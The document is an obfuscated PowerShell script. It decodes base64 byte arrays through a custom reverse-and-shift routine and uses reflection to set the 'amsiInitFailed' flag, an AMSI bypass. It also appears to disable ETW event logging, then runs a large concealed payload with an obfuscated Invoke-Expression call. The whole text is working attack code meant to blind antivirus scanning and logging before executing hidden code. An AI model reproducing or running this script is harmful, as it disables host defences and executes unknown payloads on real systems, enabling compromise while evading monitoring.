[Byte[]]$c = [System.Convert]::FromBase64String('AXQBa0BmOxsXTzxAAAFyF1xqY1wBdAFZZkEkXG1gXFpcSRdzF1lmYSRrYFhuF3MXa0BmOxsXa2VcZGxeaTgkFykqajhlbEkkF3QXWBsXTzxAFyBYGx9kWGlYZxdyF1lmYSRraVhragABchcgLxdoXCQXXHFgajExVGlrR2tlQFIfF11AAQE3HgEgZmlcUTExVGlrR2tlQFIfXGJmbWVAJVxkZWxpVmlYbRsBICAgVFtgZk1SHxcgVGlrR2tlQFIfNxdcZ3BrVlxrWF5cY1xbVmtcXlZaZWxdHxcjaVxdXWxZVmlYbRsfaVxrZWBmR2VmYGtaZWw9aWY9XGtYXlxjXDtrXD4xMVRjWF9qaVhEJWpcWmBtaVxKZ2ZpXGtlQCVcZGBrZWxJJWRca2pwSlIXNBdcZGVsaVZpWG0bAQEgX2teZVxjJVxbZlpWaVhtGxcjaVxdXWxZVmlYbRsXIycXI1xbZlpWaVhtGx9wZ2Y6MTFUY1hfamlYRCVqXFpgbWlcSmdmaVxrZUAlXGRga2VsSSVkXGtqcEpSASAnK28nFyMnJycqbycXI19rXmVcQyVcW2ZaVmlYbRsXI2ZpXFExMVRpa0drZUBSH1xiZm1lQCVYbVZpWG0bFzQXaVxdXWxZVmlYbRsBICAgVGlrR2tlQFIfFyBUKSprZUBMUhcjVCkqa2VATFIXI1QpKmtlQExSFyNUaWtHa2VAUh83F1xncGtWXGtYXlxjXFtWa1xeVlplbF0fFyMgWmZjYzhjWGxraWBNF2NjWyUpKmNcZWlcYhdqalxpW1tYVlpmaWdWa1xeVlplbF0fH2lca2VgZkdlZmBrWmVsPWlmPVxrWF5cY1w7a1w+MTFUY1hfamlYRCVqXFpgbWlcSmdmaVxrZUAlXGRga2VsSSVkXGtqcEpSFzQXWG1WaVhtGwEBdAEsKhdpZm9ZJBdUbxtSXFtmWlZpWG0bFzQXVG8bUlxbZlpWaVhtGwABchcgIiJvGxcya2VsZjolXFtmWlZpWG0bF2tjJBdvGxcyJxc0F28bHxdpZl0BASAeNDReYkMoXT5hKzxLOCg4S0RvYktFWjlMSFs8Kloua2hDOyJcPlkoK2Q6bEBiXlgsT0VsZylxW25oTllEQ00/WmFEcDhhajxbPGlCWnBnbUBhRHBAYWZBailxa29uWytcQ0kqQGFFcEBDRXBAcURwSmFjYjBaT09eTkYwSmFqbWhqW2tgWVonTTpoRmBmT05rT14scFxAZEBQTWkuKjo+ZWY4LW1dWyJKYz1kMEw8QVFsa2xsMElNY0RlTy1gbCg5KS5FSGBOXTkrWCo9XzAtTUxgOlhLLGpPYEhJXD1CMGZlbVAwSVBwZl5AcUpGYE1ubitGJyg5KEtvL0RqUUZeaTspcENjWiwsSUgnWToibDxeRCpZKltLRTA4WG9cYl1AJ0pkSnBrMGZbXj9mLWNEcCtoQytnUE8pUUVtcE87OyluLHEqQisqSC8vb0xiPUg+OkQpQSk+PGs9QzxdY0FjZUIwJ0laWE9HaEtQPDlRb2NfKmhDQU9gOEdFJyJuUDxtQF9gQ2FaYCsvW1hLOU1EPSxFSkJsZkhaZDk/W2o9T1BfMCk4UERJO05ubk1FUSdJQj0oWztebz1NSD9ZJ0U4PkonSD07Wk9ZOzg9TURbTEtCSSo4UERJO1hEXlFoOWVZO15fSUc9YkpPQSdMRm88SENEbjxFUDk7OjAnS0JjPUtsRUg+TyhiSTxBZDtJUTxMKUVgbDsoZSdoLllBX1xZLCxqOklqODhEJz1xWS1eTUcrR0huLEZbYVxDRWZGOUk+OShJTUc8cFtoLWU5OWxMYCpuRj0uYmpYWUZmY0liUT87R2k5UXBGUFpjPVBhWUAiKmpiSmFeKUpiPTw7WnFFKkRrL0BhQGAtQkdwQGBAaXBaQzkqWnFFTkJHKlxiUD0sWERwQEREOmUpcUVCO0s/Y0NFT1twSUpKJ29rPClxazwwQV5RQ0FsaClxa105WVxgQ2c6cFhpLUFPTWtnWkNvQGFASi1lcHArZFhHKlBrS0FGakxbbm9bSidJPypKbmUwWk9YbWNRKEoob0tKcVtKSjtpLUBhOG9mQ0U/K15ObGgpcUU+RVA/cENFT1puPU9ab1stK0lEcEpvPW08K0VwQGEvaHBxUUcqY3FpaCdrJ1puRXBAYEAiSnBBP0BBQWVaaEM5XGFEcEA/aGowWktmTihjb0onST9bJ0k/KkpEcEBhRHBwKXFFQT1IKFlDW2VKRWc8TUNFcE0+KCdKIk1CcG9eWFwvaypuWkNPXC1BPFwrW245ZWctL2BeLUFmOm1AJmo/aGYwOmg9OW1AP2o/aC49ak0/Kz0+WS49QE9ZKG5ZSGxAbG5sK0dGbDxaQ0kwYF4t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');[Byte[]]$d = [System.Convert]::FromBase64String('amNga0xgamQ4JWVmYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=');[Byte[]]$e = [System.Convert]::FromBase64String('W1xjYFg9a2BlQGBqZFg=');[Byte[]]$f = [System.Convert]::FromBase64String('XGlmOiVkXGtqcEo=');[Byte[]]$g = [System.Convert]::FromBase64String('aVxbYG1maUdrZVxtPCVeZWBrZVxtPCVqWmBramZlXlhgOyVkXGtqcEo=');[Byte[]]$h = [System.Convert]::FromBase64String('W1xjWVhlXFZk');[Byte[]]$i = [System.Convert]::FromBase64String('aVxbYG1maUdeZkNuazxKRyVeZWBaWGlLJWVmYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=');[Byte[]]$j = [System.Convert]::FromBase64String('aVxbYG1maUdua1w=');function O ($v){[Byte[]]$t = $v.clone();for ($x = 0; $x -lt $v.Count; $x++) {$t[$v.Count-$x-1] = $v[$x] + 3;}return $t;}$y = 9;while($y -gt 6){$c = O($c);$d = O($d);$e = O($e);$f = O($f);$g = O($g);$h = O($h);$i = O($i);$j = O($j);$y = $y - 1;}$cc = [System.Text.Encoding]::ASCII.GetString($c);[Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString($d)).GetField([System.Text.Encoding]::ASCII.GetString($e),'NonPublic, Static').SetValue($null, $true);[Reflection.Assembly]::LoadWithPartialName([System.Text.Encoding]::ASCII.GetString($f)).GetType([System.Text.Encoding]::ASCII.GetString($g)).GetField([System.Text.Encoding]::ASCII.GetString($h),'NonPublic, Instance').SetValue([Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString($i)).GetField([System.Text.Encoding]::ASCII.GetString($j),'NonPublic, Static').GetValue($null),0);i`ex($cc);
